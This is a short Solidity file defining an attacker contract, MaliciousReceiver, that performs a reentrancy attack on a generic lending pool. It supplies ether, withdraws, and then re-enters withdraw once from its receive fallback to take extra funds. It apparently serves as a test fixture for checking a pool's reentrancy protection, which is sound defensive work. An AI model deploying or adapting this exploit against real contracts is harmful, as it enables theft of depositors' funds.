// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ILendingPool {
    function supply() external payable;
    function withdraw(uint256 shares) external;
}

contract MaliciousReceiver {
    ILendingPool public immutable pool;
    bool public attacking;

    constructor(address _pool) {
        pool = ILendingPool(_pool);
    }

    function attack() external payable {
        attacking = true;
        pool.supply{value: msg.value}();
        pool.withdraw(msg.value); // 1:1 first-supplier shares
    }

    receive() external payable {
        if (attacking && address(pool).balance >= msg.value) {
            attacking = false; // single re-entry attempt
            pool.withdraw(msg.value);
        }
    }
}
